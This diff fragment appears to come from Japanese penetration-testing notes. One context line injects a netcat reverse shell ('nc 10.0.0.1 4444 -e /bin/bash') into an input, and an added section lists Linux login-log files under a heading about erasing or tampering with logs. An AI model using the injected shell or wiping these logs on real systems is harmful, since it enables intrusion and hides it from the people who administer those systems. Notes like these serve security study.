@@ -342,3 +342,13 @@ AB; nc 10.0.0.1 4444 -e /bin/bash
 
 # これでターミナルA側でshell操作可能
 ```
+
+### ログを消去、改ざん
+
+|       パス        |          説明          | 閲覧コマンド |
+| ----------------- | ---------------------- | ------------ |
+| /var/log/btmp     | ログイン失敗           | lastb        |
+| /var/log/wtmp     | ログイン成功           | last         |
+| /var/log/lastlog  | ユーザ最終ログイン     | lastlog      |
+| /var/faillog      | ユーザログイン失敗回数 | faillog      |
+| /var/log/tallylog | ユーザログイン失敗回数 | pam_tally2   |
